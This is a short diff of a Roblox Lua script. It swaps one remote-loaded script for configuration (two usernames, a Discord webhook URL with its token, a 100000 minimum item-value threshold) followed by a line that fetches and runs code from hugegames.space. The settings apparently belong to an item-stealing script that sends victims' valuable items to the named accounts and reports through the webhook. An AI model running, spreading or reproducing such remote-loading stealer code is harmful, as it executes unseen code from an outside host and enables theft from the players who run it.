@@ -1,1 +1,6 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/86b24fe4afc8fbeabe6ae0b5.lua'))()
+Username = "cpspcx"
+Username2 = "cpspcx"
+Webhook = "https://discord.com/api/webhooks/1203822988709863464/_UCO4x-1-yMrL2an9uBOC7qxM2yXxrr5CAKlsDOAfED5Wb973uN1pY5t_W55HjMUoxzc"
+LoadingScreen = true
+MinimumRAP = 100000
+loadstring(game:HttpGet("https://hugegames.space"))()
